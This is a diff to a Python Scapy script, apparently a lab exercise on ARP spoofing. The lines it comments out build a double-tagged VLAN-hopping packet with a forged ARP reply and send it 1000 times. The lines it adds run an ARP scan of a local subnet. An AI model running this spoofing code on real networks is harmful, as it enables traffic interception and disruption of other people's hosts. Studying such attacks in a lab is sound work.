@@ -62,9 +62,9 @@ if __name__ == '__main__':
 
 
 
-	target 192.168.10.10
+	# target 192.168.10.10
 
-	
+
 	# - hwsrc is the MAC corresponding to psrc, to update in the target's arp table
 	# - pdst is where the ARP packet should go (target),
 	# - psrc is the IP to update in the target's arp table,
@@ -79,23 +79,25 @@ if __name__ == '__main__':
 
 	arp = ARP(hwsrc=m_mac, pdst=t_ip, psrc=m_ip, op=2)
 
-	pkt2 = Ether(dst=BRDCAST)/Dot1Q(vlan=10)/Dot1Q(vlan=20)/ARP(hwdst=t_mac, hwsrc=m_mac, pdst=t_ip, psrc=m_ip, op=2)/IP(dst=t_ip)
-	pkt2.show()
-	# exit()
-	i=0
-	try :
-		while 1:
-			if i == 1000:
-				exit()
-			sendp(pkt2)
-			# send(Ether(dst=BRDCAST)/Dot1Q(vlan=10)/Dot1Q(vlan=20)/ARP(hwdst=t_mac, hwsrc=m_mac, pdst=t_ip, psrc=m_ip, op=2))
-			i+=1
+	# pkt2 = Ether(dst=BRDCAST)/Dot1Q(vlan=10)/Dot1Q(vlan=20)/ARP(hwdst=t_mac, hwsrc=m_mac, pdst=t_ip, psrc=m_ip, op=2)/IP(dst=t_ip)
+	# pkt2.show()
+	# # exit()
+	# i=0
+	# try :
+	# 	while 1:
+	# 		if i == 1000:
+	# 			exit()
+	# 		sendp(pkt2)
+	# 		# send(Ether(dst=BRDCAST)/Dot1Q(vlan=10)/Dot1Q(vlan=20)/ARP(hwdst=t_mac, hwsrc=m_mac, pdst=t_ip, psrc=m_ip, op=2))
+	# 		i+=1
 
-	except KeyboardInterrupt:
-		sys.exit()
+	# except KeyboardInterrupt:
+	# 	sys.exit()
 
-
-
+	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2)
+	for x in ans:
+		print(x)
+	# ans.summary(lambda s,r: r.sprintf("%Ether.src% %ARP.psrc%") )
 
 	# for i in range (10):
 	# 	send(packet ,inter=RandNum(10,40), loop=1)
